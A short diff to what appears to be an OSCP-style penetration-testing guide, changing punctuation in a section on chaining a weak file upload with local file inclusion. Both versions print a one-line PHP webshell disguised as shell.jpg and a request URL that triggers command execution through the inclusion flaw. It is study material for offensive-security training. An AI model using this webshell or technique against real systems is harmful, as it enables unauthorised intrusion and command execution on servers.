@@ -266,7 +266,7 @@ https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-t
 #### File upload + LFI
 If we have a vulnerable file upload, we can simply upload a file with a webshell payload and then include it via the LFI exploit.
 
-Let's say we upload a `shell.jpg`, with `<?php system($_GET['cmd']); ?>` contents. The file upload only check the extension and nothing else. Now, loading it standardly will just show the contents of the file, but via the LFI, we could actually get the shell to execute. We could simply request :
+Let's say we upload a `shell.jpg`, with `<?php system($_GET['cmd']); ?>` contents. The file upload only check the extension and nothing else. Now, loading it standardly will just show the contents of the file, but via the LFI, we could actually get the shell to execute. We could simply request
 `https://freeoscp.net?page=/path/to/shell/shell.jpg?cmd=id` and get command execution.
 
 
